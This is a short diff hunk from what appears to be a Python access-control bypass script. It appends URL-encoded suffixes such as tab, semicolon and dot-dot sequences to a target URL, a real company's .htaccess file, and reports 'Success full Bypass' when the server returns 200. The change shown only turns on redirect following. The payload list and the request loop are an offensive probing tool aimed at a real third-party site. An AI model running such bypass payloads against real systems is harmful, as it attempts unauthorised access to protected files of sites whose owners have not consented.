@@ -11,7 +11,7 @@ exten = ['+', ' #? ', ' %09 ', ' %09%3b ', ' %09.. ', ' %09; ', ' %20 ', ' %23%3
 urls = "https://www.apple.com/.htaccess"
 
 def payloads1(url, etx):
-    send = requests.get(url+etx, allow_redirects=False)
+    send = requests.get(url+etx, allow_redirects=True)
     if send.status_code == 200:
         console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{send.url}, status: {send.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
     else:
